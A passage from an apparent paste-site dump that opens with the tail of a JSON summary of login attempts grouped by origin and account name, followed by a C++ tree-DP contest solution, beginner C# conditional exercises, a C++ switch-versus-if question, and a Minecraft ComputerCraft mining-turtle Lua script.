    ""Ipxo Limited"": 2,
    ""IONOS SE"": 1,
    ""BT Public Internet Service"": 2,
    ""Hyonix LLC"": 5,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Chinanet"": 3,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""Datacamp Limited"": 5,
    ""ReliableSite.Net LLC"": 1,
    ""ColocationX Ltd."": 6,
    ""CNC Group CHINA169 Tianjin Province network"": 1,
    ""Chang Way Technologies Co. Limited"": 3,
    ""DigitalOcean, LLC"": 4,
    ""OVH Hosting"": 23396,
    ""PT Telekomunikasi Indonesia"": 1
  },
  ""org"": {
    ""Contabo GmbH"": 163,
    ""Xhost Internet Solutions"": 8,
    ""Flyservers S.A"": 25,
    ""Unknown"": 23406,
    ""Verizon Business"": 20,
    ""Palo Alto Networks, Inc"": 12,
    ""Zhenjiang Guangyuan Network Technology Co., Ltd."": 2,
    ""RIMA (Red IP Multi Acceso)"": 18,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""UAB Host Baltic"": 4,
    ""BtHoster LTD"": 3,
    ""Xhostis"": 2,
    ""Hetzner"": 6,
    ""VietServer Services technology company limited"": 1,
    ""China Mobile Communications Corporation"": 2,
    ""Bandito Networks"": 2,
    ""IONOS"": 1,
    ""HostUS"": 5,
    ""Ucloud Information Technology"": 1,
    ""Chinanet JS"": 3,
    ""Alviva Holding Limited"": 3,
    ""Aliyun Computing Co., LTD"": 1,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""Cdnext DAL"": 5,
    ""Herrera Mario"": 1,
    ""Makut Investments"": 3,
    ""ColocationX Ltd"": 3,
    ""BeiJing QianJingShiJi Co., Ltd."": 1,
    ""Starcrecium Limited"": 3,
    ""DigitalOcean, LLC"": 4,
    ""Telekomunikasi Indonesia"": 1
  },
  ""regionName"": {
    ""England"": 165,
    ""North Holland"": 13,
    ""Kaunas"": 25,
    ""Tirana"": 6,
    ""New Jersey"": 20,
    ""California"": 12,
    ""Jiangsu"": 5,
    ""Madrid"": 18,
    ""Virginia"": 5,
    ""Vilnius"": 4,
    ""Bavaria"": 3,
    ""Saxony"": 6,
    ""Da Nang"": 1,
    ""Guangdong"": 2,
    ""Addis Ababa"": 2,
    ""New York"": 2,
    ""North Rhine-Westphalia"": 1,
    ""Texas"": 10,
    ""Hesse"": 3,
    ""Beijing"": 1,
    ""Hubei"": 1,
    ""Florida"": 1,
    ""Tianjin"": 1,
    ""Moscow"": 3,
    ""Central Singapore"": 4,
    ""Quebec"": 23396,
    ""Jakarta"": 1
  },
  ""country"": {
    ""United Kingdom"": 165,
    ""The Netherlands"": 13,
    ""Lithuania"": 29,
    ""Albania"": 6,
    ""United States"": 50,
    ""China"": 10,
    ""Spain"": 18,
    ""Germany"": 13,
    ""Vietnam"": 1,
    ""Ethiopia"": 2,
    ""Russia"": 3,
    ""Singapore"": 4,
    ""Canada"": 23396,
    ""Indonesia"": 1
  },
  ""account"": {
    ""hello"": 191,
    ""Administr"": 12,
    ""142.93.8.59"": 65,
    ""IQYLHMGqw"": 1,
    ""WIlJSA"": 1,
    ""VrRWjm"": 1,
    ""nmap"": 2,
    ""Test"": 13,
    ""Domain"": 15,
    ""ERIosTyqe"": 1,
    ""EGAudi"": 1,
    ""wbZERN"": 1,
    ""(empty)"": 4,
    ""Administrator"": 1,
    ""CptQApKMN"": 1,
    ""XdOtjW"": 1,
    ""HrOFHA"": 1,
    ""NCRACK_USER"": 23396,
    ""RPWCsiMRn"": 1,
    ""nJgjac"": 1,
    ""vxQEoz"": 1
  },
  ""keyboard"": {
    ""Unknown"": 23711
  },
  ""client_build"": {
    ""Unknown"": 23711
  },
  ""client_name"": {
    ""Unknown"": 23711
  },
  ""ip_type"": {
    ""hosting"": 190,
    ""Unknown"": 106,
    ""proxy"": 6,
    ""mobile"": 6,
    ""mobile & proxy"": 2,
    ""hosting & proxy"": 23401
  }
}"
1fUBva2b,Untitled,a_chn,C++,Monday 15th of January 2024 05:59:53 PM CDT,"#include <iostream>
#include <algorithm>
#include <utility>
#include <vector>
#include <stack>
#include <map>
#include <queue>
#include <set>
#include <unordered_set>
#include <unordered_map>
#include <cstring>
#include <cmath>
#include <functional>
#include <cassert>
#include <iomanip>
#include <numeric>
#include <bitset>
#include <sstream>
#include <chrono>
#include <random>

#define ff first
#define ss second
#define ll long long
#define ld long double
#define PB push_back
#define MP make_pair
#define MT make_tuple
#define EB emplace_back
#define PoB pop_back
#define LOG log2
#define FOR(i,a,b) for (int i = (a); i < (b); ++i)
#define F0R(i,a) FOR(i,0,a)
#define ROF(i,a,b) for (int i = (b)-1; i >= (a); --i)
#define R0F(i,a) ROF(i,0,a)
#define fch(t, v) for (auto t : v)
#define sz(x) int(x.size())
#define rsz resize
#define gp(x) vector<vector<x>>
#define btree vector<pii>
#define vll vector<ll>
#define Max(a, b, c) max(max(a,b),c)
#define fMax(a, b, c, d) max(Max(a, b, c), dp)
#define Min(a, b, c) min(min(a,b),c)
#define Mid(a, b, c) max(min(a, b), min(max(a, b), c))
#define st(a) set<a>
#define gr(x) greater<x>
#define gi greater<int>
#define all(x) (x).begin(),(x).end()
#define tri(x) tuple<x,x,x>
#define pil pair<int, long>
#define ull unsigned long long
#define eps 1e-9
//#define debug(x) cout << '>' << #x << ':' << x << endl;

using namespace std;

void __print(int x) {cerr << x;}
void __print(long x) {cerr << x;}
void __print(long long x) {cerr << x;}
void __print(unsigned x) {cerr << x;}
void __print(unsigned long x) {cerr << x;}
void __print(unsigned long long x) {cerr << x;}
void __print(float x) {cerr << x;}
void __print(double x) {cerr << x;}
void __print(long double x) {cerr << x;}
void __print(char x) {cerr << '\'' << x << '\'';}
void __print(const char *x) {cerr << '\""' << x << '\""';}
void __print(const string &x) {cerr << '\""' << x << '\""';}
void __print(bool x) {cerr << (x ? ""true"" : ""false"");}

template<typename T, typename V>
void __print(const pair<T, V> &x) {cerr << '{'; __print(x.first); cerr << "", ""; __print(x.second); cerr << '}';}
template<typename T>
void __print(const T &x) {int f = 0; cerr << '{'; for (auto &i: x) cerr << (f++ ? "", "" : """"), __print(i); cerr << ""}"";}
void _print() {cerr << ""]\n"";}
template <typename T, typename... V>
void _print(T t, V... v) {__print(t); if (sizeof...(v)) cerr << "", ""; _print(v...);}
void println() {cerr << "">--------------------<"" << endl;}
void printm(vector<vector<int>>& mat) {
    cerr << ""matrix: "" << endl;
    for (int i = 0; i<(int)mat.size(); i++) {for (int j = 0; j<(int)mat[0].size(); j++) {cerr << mat[i][j] << "" "";} cerr << endl;}
}

#ifndef ONLINE_JUDGE
#define debug(x...) cerr << ""["" << #x << ""] = [""; _print(x)
#else
#define debug(x...)
#endif

typedef pair<int, int> pii;
typedef pair<ll, ll> pll;
typedef vector<int> vi;

// templates
template <class T> bool ckmin(T &a, const T &b) {return b<a ? a = b, 1 : 0;}
template <class T> bool ckmax(T &a, const T &b) {return b>a ? a = b, 1 : 0;}
mt19937_64 rng_ll(chrono::steady_clock::now().time_since_epoch().count());
template <class T> using vc = vector<T>;
template <class T> using p_q = priority_queue<T>;
template <class T> using pqg = priority_queue<T, vc<T>, greater<T>>;
int rng(int M) {return (int)(rng_ll()%M);}

constexpr int INF = (int)2e9;
int MOD = 998244353;
constexpr ll LL_INF = (ll)3e18;
constexpr int mod = (int)1e9 + 7;
constexpr ll inverse = 500000004LL; // inverse of 2 modulo 1e9 + 7

void setIO(const string& str) {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    if (str.empty()) return;
    freopen((str + "".in"").c_str(), ""r"", stdin);
    freopen((str + "".out"").c_str(), ""w"", stdout);
}

int N, T;
vc<vi> adj;
vll a, dp, s, t, leaf, pd;
vi contains;

struct LCA {
    int N; // assuming ONE INDEXED
    vector<vector<int>> adj, up;
    int L = 20;
    int timer = 0;
    vector<int> tin, tout;
    void dfs(int v, int par) { // par MUST BE EQUAL TO V at the start
        tin[v] = timer++;
        up[v][0] = par;
        for (int i = 1; i <= L; ++i) up[v][i] = up[up[v][i-1]][i-1];
        fch(u, adj[v]) if (u != par) dfs(u, v);
        tout[v] = timer++;
    }
    LCA(int n, int root, const vc<vi>& trump) {
        N = n;
        adj = trump;
        up.clear(), up.rsz(N+1, vi(L+1));
        tin.clear(), tin.rsz(N+1), tout.clear(), tout.rsz(N+1);
        timer = 0;
        dfs(root, root);
    }
    bool bruh(int u, int v) { // this function checks if u is ancestor of v
        return tin[u] <= tin[v] && tout[u] >= tout[v];
    }
    int lca(int u, int v) {
        if (bruh(u, v)) return u;
        if (bruh(v, u)) return v;
        for (int i = L; i >= 0; --i) if (!bruh(up[u][i], v)) u = up[u][i];
        return up[u][0];
    }
};

void dfs(int v) {
    s[v] = a[v];
    t[v] = 0;
    fch(u, adj[v]) {
        dfs(u);
        t[v] += 2 + t[u];
        s[v] += s[u];
    }
    sort(all(adj[v]), [&](const int& a, const int& b) {
        return s[b] * (t[a] + 2) < (t[b] + 2) * s[a];
    });
    ll time = 0;
    fch(u, adj[v]) {
        time++;
        dp[v] += dp[u] + s[u] * time;
        time += 1 + t[u];
    }
}

void dfs2(int v) {
    s[v] = a[v];
    t[v] = 0;
    fch(u, adj[v]) {
        dfs2(u);
        s[v] += s[u];
        t[v] += 2 + t[u];
        ckmax(leaf[v], leaf[u] + 1);
    }
    ll L = leaf[v] - 1;
    if (sz(adj[v]) == 0) {
        pd[v] = dp[v];
        return;
    }
    sort(all(adj[v]), [&](const int& a, const int& b) {
        return s[b] * (t[a] + 2) < (t[b] + 2) * s[a];
    });
    ll time = 0;
    int M = sz(adj[v]);
    vll psum;
    fch(u, adj[v]) {
        time++;
        dp[v] += dp[u] + s[u] * time;
        time += 1 + t[u];
        ll prev = (!psum.empty() ? psum.back() : 0);
        psum.PB(prev + 2 + t[u]);
    }
    ll ssum = 0;
    for (int i = M-1; i >= 0; --i) {
        int u = adj[v][i];
        if (leaf[u] == L) {
            ll end_minus = (2 + t[u]) * (ssum);
            ll u_time = (i > 0 ? psum[i-1] : 0) * s[u];
            ll new_u_time = (psum[M-1] - (2 + t[u])) * s[u];
            ckmin(pd[v], dp[v] - end_minus - u_time + new_u_time - dp[u] + pd[u]);
        }
        ssum += s[u];
    }
}

void solve0() {
    dfs(1);
    cout << t[1] << ' ' << dp[1] << '\n';
}

void solve1() {
    leaf.rsz(N+1, 0), pd.rsz(N+1, LL_INF);
    dfs2(1);
    cout << t[1] - leaf[1] << ' ' << pd[1] << '\n';
}

int main() { // TIME YOURSELF !!!
    setIO("""");
    cin >> N >> T;
    adj.rsz(N+1), a.rsz(N+1), dp.rsz(N+1, 0), s.rsz(N+1), t.rsz(N+1), contains.rsz(N+1, 0);
    for (int i = 2; i <= N; i++) {
        int pi, ai;
        cin >> pi >> ai;
        adj[pi].PB(i);
        a[i] = ai;
    }
    if (T == 0) solve0();
    else solve1();
    return 0;
}

// CHECK LONG LONGS, binary search on ans?
// Do something, start simpler
// IBM motto: THINK
"
78jecHiy,06.NumberInRange,IvanITD,C#,Monday 15th of January 2024 05:52:08 PM CDT,"int number = int.Parse(Console.ReadLine());
if (number >= -100 && number <= 100 && number != 0)
{
    Console.WriteLine(""Yes"");
}
else
{
    Console.WriteLine(""No"");
}
"
CizM9Td9,05.SmallShop,IvanITD,C#,Monday 15th of January 2024 05:51:05 PM CDT,"string product = Console.ReadLine();
string city = Console.ReadLine();
double quantity = double.Parse(Console.ReadLine());

double coffee;
double water;
double beer;
double sweets;
double peanuts;

// Here we solved the task using the if else statement

if (city == ""Sofia"")
{
    if (product == ""coffee"")
    {
        coffee = 0.50;
        quantity *= coffee;
    }
    else if (product == ""water"")
    {
        water = 0.80;
        quantity *= water;
    }
    else if (product == ""beer"")
    {
        beer = 1.20;
        quantity *= beer;
    }
    else if (product == ""sweets"")
    {
        sweets = 1.45;
        quantity *= sweets;
    }
    else if (product == ""peanuts"")
    {
        peanuts = 1.60;
        quantity *= peanuts;
    }
}
else if (city == ""Plovdiv"")
{
    if (product == ""coffee"")
    {
        coffee = 0.40;
        quantity *= coffee;
    }
    else if (product == ""water"")
    {
        water = 0.70;
        quantity *= water;
    }
    else if (product == ""beer"")
    {
        beer = 1.15;
        quantity *= beer;
    }
    else if (product == ""sweets"")
    {
        sweets = 1.30;
        quantity *= sweets;
    }
    else if (product == ""peanuts"")
    {
        peanuts = 1.50;
        quantity *= peanuts;
    }
}
else if (city == ""Varna"")
{
    if (product == ""coffee"")
    {
        coffee = 0.45;
        quantity *= coffee;
    }
    else if (product == ""water"")
    {
        water = 0.70;
        quantity *= water;
    }
    else if (product == ""beer"")
    {
        beer = 1.10;
        quantity *= beer;
    }
    else if (product == ""sweets"")
    {
        sweets = 1.35;
        quantity *= sweets;
    }
    else if (product == ""peanuts"")
    {
        peanuts = 1.55;
        quantity *= peanuts;
    }
}
Console.WriteLine(quantity);
"
yEYFs2MH,04.PersonalTitles,IvanITD,C#,Monday 15th of January 2024 05:49:00 PM CDT,"double age = double.Parse(Console.ReadLine());
char sex = char.Parse(Console.ReadLine());

// Solved this task with the if else statement

if (sex == 'm')
{
	if (age >= 16)
	{
        Console.WriteLine(""Mr."");
    }
	else if (age < 16)
	{
        Console.WriteLine(""Master"");
    }
}
else if (sex == 'f')
{
    if (age >= 16)
    {
        Console.WriteLine(""Ms."");
    }
    else if (age < 16)
    {
        Console.WriteLine(""Miss"");
    }
}

// Solved this task with the switch case statement
switch (sex)
{
    case 'm':
        switch (age)
        {
            case >= 16:
                Console.WriteLine(""Mr."");
                break;

            case < 16:
                Console.WriteLine(""Master"");
                break;
        }
    break;


    case 'f':
        switch (age)
        {
            case >= 16:
                Console.WriteLine(""Ms."");
                break;

            case < 16:
                Console.WriteLine(""Miss"");
                break;
        }
    break;
}"
pHLgSjnZ,03.AnimalType,IvanITD,C#,Monday 15th of January 2024 05:47:09 PM CDT,"using System.Runtime.CompilerServices;

string animalType = Console.ReadLine();

//This is the first way of solving the task with the if else statement

if (animalType == ""dog"")
{
    Console.WriteLine(""mammal"");
}
else if (animalType == ""crocodile"" || animalType == ""tortoise"" || animalType == ""snake"")
{
    Console.WriteLine(""reptile"");
}
else
{
    Console.WriteLine(""unknown"");
}

//This is the second way of solving the task with the switch case

switch (animalType)
{
    case ""dog"":
        Console.WriteLine(""mammal"");
        break;

    case ""crocodile"":
    case ""tortoise"":
    case ""snake"":
        Console.WriteLine(""reptile"");
        break;

    default:
        Console.WriteLine(""unknown"");
        break;
}"
CDYC5mif,Loop breaking.,alansam,C++,Monday 15th of January 2024 05:31:34 PM CDT,"/*
 * Trying to refactor someone else's code from codingame website.
 * I am trying to replace a massive if else block with a switch statement.
 * I cannot figure out why my statement is not equivalent to there's.
 * Sorry for the long post. My Git seems broken lately.
 * Can someone explain please?
 */

#include <iostream>
#include <string>
#include <vector>
#include <algorithm>

#define SWITCH_

int L = 8;
int C = 8;
int N;

std::vector<std::string> rows = {
  {""########""},
  {""# @    #""},
  {""#     X#""},
  {""# XXX  #""},
  {""#   XX #""},
  {""#   XX #""},
  {""#     $#""},
  {""########""}
};

std::pair<int, int> move(std::string s, std::pair<int, int> lpos) {
  if      (s == ""SOUTH"") { lpos.second++; }
  else if (s == ""WEST"")  { lpos.first--; }
  else if (s == ""EAST"")  { lpos.first++; }
  else if (s == ""NORTH"") { lpos.second--; }
  return lpos;
}

bool isPassable(std::string dir, std::pair<int, int> pos, bool dis) {
  std::pair<int, int> npos = move(dir, pos);
  if (npos.first < 0 || npos.second < 0 || npos.first >= C || npos.second >= L) {
    return false;
  }
  auto c = rows[npos.second][npos.first];
  return !(c == '#' || (c == 'X' && !dis));
}

int main() {
  std::pair<int, int> pos;
  std::vector<std::string> directions = { ""SOUTH"", ""EAST"", ""NORTH"", ""WEST"" };
  std::vector<std::pair<int, int>> tl;
  std::string out = """";
  bool BM {};
  rows.resize(L);
  for (auto i = 0ul; i < L; i++) {
    auto f = rows[i].find(""@"");
    if (f != std::string::npos) {
      pos = std::make_pair(f, i);
    }
    for (auto j = 0ul; j < rows[i].size(); j++) {
      if (rows[i][j] == 'T') {
        tl.emplace_back(j, i);
      }
    }
  }

  std::string dir = ""SOUTH"";
  /* loop forever */ while (true) {
    if (!isPassable(dir, pos, BM)) {
      for (auto const & ds : directions) {
        if (isPassable(ds, pos, BM)) {
          dir = ds;
          break;
        }
      }
    }

    out += dir + ""\n"";
    pos = move(dir, pos);

    char block = rows[pos.second][pos.first];
#ifdef SWITCH_
    //My Way...Seems to loop infinitely.
    auto complete { false }; /* flag for loop termination - initially false */
    switch (block) {
      case 'X':
        rows[pos.second].replace(pos.first, 1, "" "");
        break;

      case '$':
        /* loop should terminate - set flag */
 		complete = true;
        break;

      default:
        for (auto const & ds : directions) {
          if (ds[0] == block) {
            dir = ds;
            break;
          }
        }
    }
    if (complete) { /* terminate forever loop */ break; }
#else
    //Their Way...Works
    if (block == 'X') {
      rows[pos.second].replace(pos.first, 1, "" "");
    }
    else if (block == '$') { 
      break;
    }
    else {
      for (auto const & ds : directions) {
        if (ds[0] == block) {
          dir = ds;
          /* terminate forever loop */  break;
        }
      }
    }
#endif

    // Loop check
    N++;
    if (N > C * L) {
      out = ""LOOP\n"";
      break;
    }
  }
  std::cout << out;
}
"
bBKKSZTY,mineXxX.lua,Pixel1011,Lua,Monday 15th of January 2024 05:30:05 PM CDT,"
    turnLeft()"
vWz6WJxB,02.WeekendorWorkDay,IvanITD,C#,Monday 15th of January 2024 05:25:49 PM CDT,"string dayOfWeek = Console.ReadLine();

// Firstly we will write the solution of this task with the if else statement

if (dayOfWeek == ""Monday"" || dayOfWeek == ""Tuesday"" || dayOfWeek == ""Wednesday"" || dayOfWeek == ""Thursday"" || dayOfWeek == ""Friday"")
{
    Console.WriteLine(""Working day"");
}
else if (dayOfWeek == ""Saturday"" || dayOfWeek == ""Sunday"")
{
    Console.WriteLine(""Weekend"");
}
else
{
    Console.WriteLine(""Error"");
}


// The second solution is with the switch case

switch (dayOfWeek)
{
    case ""Monday"":
    case ""Tuesday"":
    case ""Wednesday"":
    case ""Thursday"":
    case ""Friday"":
        Console.WriteLine(""Working day"");
        break;

    case ""Saturday"":
    case ""Sunday"":
        Console.WriteLine(""Weekend"");
        break;
        default:
        Console.WriteLine(""Error"");
            break;


        //For this task we resolved the problem with two different solutions
}"
L23jvSRZ,01.DayOfWeek,IvanITD,C#,Monday 15th of January 2024 05:24:24 PM CDT,"int number = int.Parse(Console.ReadLine());


//First way of solving this task is with the if else statement

if (number == 1 || number == 2 || number == 3 || number == 4 || number == 5 || number == 6 || number == 7)
{
    if (number == 1)
    {
        Console.WriteLine(""Monday"");
    }
    else if (number == 2)
    {
        Console.WriteLine(""Tuesday"");
    }
    else if (number == 3)
    {
        Console.WriteLine(""Wednesday"");
    }
    else if (number == 4)
    {
        Console.WriteLine(""Thursday"");
    }
    else if (number == 5)
    {
        Console.WriteLine(""Friday"");
    }
    else if (number == 6)
    {
        Console.WriteLine(""Saturday"");
    }
    else if (number == 7)
    {
        Console.WriteLine(""Sunday"");
    }
    else
    {
        Console.WriteLine(""Error"");
    }
}
else
{
    Console.WriteLine(""Error"");
}


//The second way of solving this task is with the switch case

switch (number)
{
    case 1:
        Console.WriteLine(""Monday"");
        break;

    case 2:
        Console.WriteLine(""Tuesday"");
        break;

    case 3:
        Console.WriteLine(""Wednesday"");
        break;

    case 4:
        Console.WriteLine(""Thursday"");
        break;

    case 5:
        Console.WriteLine(""Friday"");
        break;
    
    case 6:
        Console.WriteLine(""Saturday"");
        break;

    case 7:
        Console.WriteLine(""Sunday"");
        break;

    default:
        Console.WriteLine(""Error"");
        break;
}"
xqG7rUSG,08.LunchBreak,IvanITD,C#,Monday 15th of January 2024 05:23:06 PM CDT,"string serialName = Console.ReadLine();
int episodeLength = int.Parse(Console.ReadLine());
int restLength = int.Parse(Console.ReadLine());

double timeForLunch = restLength * 0.125;
double timeForRest = restLength * 0.25;
double remainingTime = restLength - timeForLunch - timeForRest;


if (remainingTime >= episodeLength)
{
    Console.WriteLine($""You have enough time to watch {serialName} and left with {Math.Ceiling(remainingTime - episodeLength)} minutes free time."");
}
else if (remainingTime < episodeLength)
{
    
    Console.WriteLine($""You don't have enough time to watch {serialName}, you need {Math.Ceiling(episodeLength - remainingTime)} more minutes."");
}
"
usBiPP3k,mineXxX.lua,Pixel1011,Lua,Monday 15th of January 2024 05:21:45 PM CDT,"yMine = 15
xMine = 15
-- mining area
-- starts from bottom left corner, mines 1, then mines bottom row, goes up, mines left, repeat
 
function writeOffset(offset)
    local file = fs.open(""offset.txt"", ""w"")
    file.writeLine(tostring(offset))
    file.close()
end
 
function writeCoords()
    local file = fs.open(""coords.txt"", ""w"")
    file.writeLine("""" .. coords.x .. "", "" .. coords.y .. "", "" .. coords.z)
    file.close()
end
 
function writeStartingPos()
    local file = fs.open(""startingPos.txt"", ""w"")
    file.writeLine("""" .. 1 + readOffset() .. "", "" .. startingPos.y .. "", "" .. startingPos.z)
    file.close()
end

function writeFace(face)
    local file = fs.open(""face.txt"", ""w"")
    file.writeLine(face);
    file.close()
end

-- change facing etc
function readFace()
    local file = fs.open(""face.txt"", ""r"")
    if file == nil then
        writeFace(""north"")
        return ""north""
    end
    local faceLine = file.readLine()
    file.close()
end
 
function readOffset()
  if fs.exists(""offset.txt"") then
    local file = fs.open(""offset.txt"", ""r"")
    local offsetLine = file.readLine()
    file.close()
    return tonumber(offsetLine)
  else
    writeOffset(0)
    return 0
  end
end
 
function readCoords()
  if fs.exists(""coords.txt"") then
    local file = fs.open(""coords.txt"", ""r"")
    local coordsLine = file.readLine()
    file.close()
    local x, y, z = string.match(coordsLine, ""(%d+), (%d+), (%d+)"")
    return {x = tonumber(x), y = tonumber(y), z = tonumber(z)}
  else
    writeCoords()
    return {x = 0, y = 0, z = 0}
  end
 
end
 
function readStartingPos()
  if fs.exists(""startingPos.txt"") then
    local file = fs.open(""startingPos.txt"", ""r"")
    local startingPosLine = file.readLine()
    file.close()
    local x, y, z = string.match(startingPosLine, ""(%d+), (%d+), (%d+)"")
    return {x = tonumber(x), y = tonumber(y), z = tonumber(z)}
  else
    writeStartingPos()
    return {x = 0, y = 0, z = 0}
  end
end
 
 
function dropUselessItems()
  local useless = {""minecraft:cobblestone"", ""minecraft:dirt"", ""minecraft:sand"", ""minecraft:gravel"", ""minecraft:cobbled_deepslate"", ""minecraft:tuff""}
 
  for i = 1, 16 do
    local item = turtle.getItemDetail(i)
    if item and contains(useless, item.name) then
      turtle.select(i)
      turtle.drop()
    end
  end
end
 
function contains(table, val)
   for i=1,#table do
      if table[i] == val then 
         return true
      end
   end
   return false
end
 
-- starts on right side of mining area infront of chest, facing chest
coords = {x = 0, y = 0, z = 0}
 
function moveToLong(target)
  local directions = {
    x = target.x > coords.x and ""forward"" or ""back"",
    y = target.y > coords.y and ""up"" or ""down"",
    z = target.z > coords.z and ""right"" or ""left""
  }
 
  for axis, direction in pairs(directions) do
    local difference = math.abs(target[axis] - coords[axis])
 
    if direction == ""forward"" or direction == ""back"" then
      if direction == ""back"" then
        turnRight()
        turnRight()
      end
      for i = 1, difference do
        writeCoords()
        turtle.dig()
        turtle.forward()
      end
      if direction == ""back"" then
        turnRight()
        turnRight()
      end
      coords.x = target.x
      print(""coords.x = "" .. coords.x)
    elseif direction == ""up"" or direction == ""down"" then
      for i = 1, difference do
        writeCoords()
        if direction == ""up"" then
          turtle.digUp()
          turtle.up()
        else
          turtle.digDown()
          turtle.down()
        end
      end
      coords.y = target.y
      print(""coords.y = "" .. coords.y)
    elseif direction == ""right"" or direction == ""left"" then
      if direction == ""right"" then
        turnRight()
      else
        turnLeft()
      end
      for i = 1, difference do
        writeCoords()
        turtle.dig()
        turtle.forward()
      end
      if direction == ""right"" then
        turnLeft()
      else
        turnRight()
      end
      coords.z = target.z
      print(""coords.z = "" .. coords.z)
    end
  end
end
 
function moveToShort(target)
  if target.x == coords.x and target.y == coords.y and target.z == coords.z then
    return
  end
  local directions = {
    x = target.x > coords.x and ""forward"" or ""back"",
    y = target.y > coords.y and ""up"" or ""down"",
    z = target.z > coords.z and ""right"" or ""left""
  }
  
  for axis, direction in pairs(directions) do
    local difference = math.abs(target[axis] - coords[axis])
    writeCoords()
    
    for i = 1, difference do
      if direction == ""forward"" then
        turtle.dig()
        turtle.forward()
        writeCoords()
        coords.x = coords.x + 1
      elseif direction == ""back"" then
        turnLeft()
        turnLeft()
        turtle.dig()
        turtle.forward()
        writeCoords()
        turnLeft()
        turnLeft()
        coords.x = coords.x - 1
      elseif direction == ""up"" then
        turtle.digUp()
        turtle.up()
        writeCoords()
        coords.y = coords.y + 1
      elseif direction == ""down"" then
        turtle.digDown()
        turtle.down()
        writeCoords()
        coords.y = coords.y - 1
      elseif direction == ""right"" then
        turnRight()
        turtle.dig()
        turtle.forward()
        writeCoords()
        turnLeft()
        coords.z = coords.z + 1
      elseif direction == ""left"" then
        turnLeft()
        turtle.dig()
        turtle.forward()
        writeCoords()
        turnRight()
        coords.z = coords.z - 1
      end
    end
  end
end
 
function Translate(x, y, z)
  x = x or 0
  y = y or 0
  z = z or 0
  if (math.abs(x) > 1 or math.abs(y) > 1 or math.abs(z) > 1) then
    moveToLong({x = coords.x + x, y = coords.y + y, z = coords.z + z});
  else
    moveToShort({x = coords.x + x, y = coords.y + y, z = coords.z + z});
  end
end
 
function dropAllToChest()
  moveToLong({x = 0, y = 0, z = 0})
  face(""minecraft:chest"")
for i = 1, 16 do
    if turtle.getItemCount(i) > 0 then
      turtle.select(i)
      if not turtle.drop() then
        print(""Chest is full. Terminating program."")
        os.exit()
      end
    end
  end
end
 
-- we consider normally facing north at start
facing = readFace()
-- will endless loop if no block, however this should never happen
function face(targetBlock)
  local success, data = turtle.inspect()
  if (data.name == targetBlock) or not success then
    repeat
      turnLeft()
      success, data = turtle.inspect()
    until data.name == targetBlock
  end
end

function faceUntil(face)
  while facing ~= face do
    turnLeft()
  end
end

function turnLeft()
  turtle.turnLeft()
  if facing == ""north"" then
    facing = ""west""
  elseif facing == ""west"" then
    facing = ""south""
  elseif facing == ""south"" then
    facing = ""east""
  elseif facing == ""east"" then
    facing = ""north""
  end
  writeFace(facing)
end

function turnRight()
  turtle.turnRight()
  if facing == ""north"" then
    facing = ""east""
  elseif facing == ""east"" then
    facing = ""south""
  elseif facing == ""south"" then
    facing = ""west""
  elseif facing == ""west"" then
    facing = ""north""
  end
  writeFace(facing)
end
 
function isFull()
  for i = 1, 16 do
    if turtle.getItemCount(i) == 0 then
      return false
    end
  end
  return true
end
 
-- mine 1 block forward (X) to get into starting position
-- then mine bottom row going right
-- then mine up 1, mine left row going left
-- alternate until done all rows
-- then go back to starting position, if inventory full of unwanted items (eg full after doing dropUseless()), dump into chest,
-- then go back to starting position and repeat forever (or until chest full)
-- x++ = forward  
-- y++ = up
-- z++ = right
startingPos = readStartingPos()
rowsMined = readOffset()
function mine()
  coords = readCoords()
  faceUntil(""south"")
  if coords.x == 0 and coords.y == 0 and coords.z == 0 then
    -- starting from facing chest
    print(""turning around"")
    turnLeft()
    turnLeft()
  end
  while true do
    print(""starting mining loop"");
    
    print(""moving to starting position"")
    moveToLong(startingPos)
    startingPos = {x = coords.x, y = coords.y, z = coords.z}
    writeStartingPos()
    for i = 1, yMine do
      for j = 1, xMine do
        print(""mining row"")
        turtle.dig()
        Translate(0,0,1)
        checkandEmpty()
      end
      print(""moving back to start of row"")
      moveToLong(startingPos)
      print(""moving up 1"")
      Translate(0,1,0)
      startingPos = {x = coords.x, y = coords.y, z = coords.z}
      writeStartingPos()
    end
    rowsMined = rowsMined + 2
    writeOffset(rowsMined)
    print(""Walls mined: "" .. rowsMined)
    print(""moving back down to bottom row and going forward"")
    Translate(2, -yMine, 0)
    startingPos = {x = coords.x, y = coords.y, z = coords.z}
    writeStartingPos()
    print(""checking if full"")
 
  end
end
 
lastPosToGoToIFEmptying = {x = 0, y = 0, z = 0}
function checkandEmpty()
  lastPosToGoToIFEmptying = {x = coords.x, y = coords.y, z = coords.z}
  if (isFull()) then
    print(""inventory full, going to empty"")
    dropUselessItems()
    dropAllToChest()
    print(""turning around"")
    turnLeft()
    turnLeft()
    print(""going back to mining area"")
    moveToLong(lastPosToGoToIFEmptying)
  end
end
mine()"
cJnUu2mv,07.Shopping,IvanITD,C#,Monday 15th of January 2024 05:21:44 PM CDT,"double petarBudget = double.Parse(Console.ReadLine());
int GPUAmount = int.Parse(Console.ReadLine());
int CPUAmount = int.Parse(Console.ReadLine());
int RAMAmount = int.Parse(Console.ReadLine());


double GPUPrice = GPUAmount * 250;
double CPUPrice = (GPUPrice * 0.35) * CPUAmount;
double RAMPrice = (GPUPrice * 0.10) * RAMAmount;

double totalPrice = GPUPrice + CPUPrice  + RAMPrice;

if (GPUAmount > CPUAmount)
{
    totalPrice -= totalPrice * 0.15;
}


if (totalPrice <= petarBudget)
{
    Console.WriteLine($""You have {petarBudget - totalPrice:F2} leva left!"");
}
else if (totalPrice > petarBudget)
{
    Console.WriteLine($""Not enough money! You need {Math.Abs(petarBudget - totalPrice):F2} leva more!"");
}
"
ypsCp7Sn,06.WorldSwimmingRecord,IvanITD,C#,Monday 15th of January 2024 05:20:38 PM CDT,"double recordInSeconds = double.Parse(Console.ReadLine());
double distanceInMeters = double.Parse(Console.ReadLine());
double timeInSeconds = double.Parse(Console.ReadLine());

double swimmingTime = distanceInMeters * timeInSeconds;

double delay = Math.Floor(distanceInMeters / 15);

swimmingTime = swimmingTime + delay * 12.5;

if (swimmingTime < recordInSeconds)
{
    Console.WriteLine($""Yes, he succeeded! The new world record is {swimmingTime:F2} seconds."");
}
else
{
